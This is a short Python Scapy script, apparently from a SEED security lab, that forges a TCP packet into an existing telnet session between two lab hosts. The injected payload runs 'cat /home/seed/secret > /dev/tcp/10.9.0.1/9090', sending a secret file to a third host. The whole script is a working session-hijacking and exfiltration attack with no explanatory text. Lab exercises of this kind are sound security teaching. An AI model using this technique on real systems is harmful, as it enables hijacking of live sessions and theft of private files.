#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=55350, dport=23, flags="A", seq=619444486, ack=3467189967)
data = "\ncat /home/seed/secret > /dev/tcp/10.9.0.1/9090\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)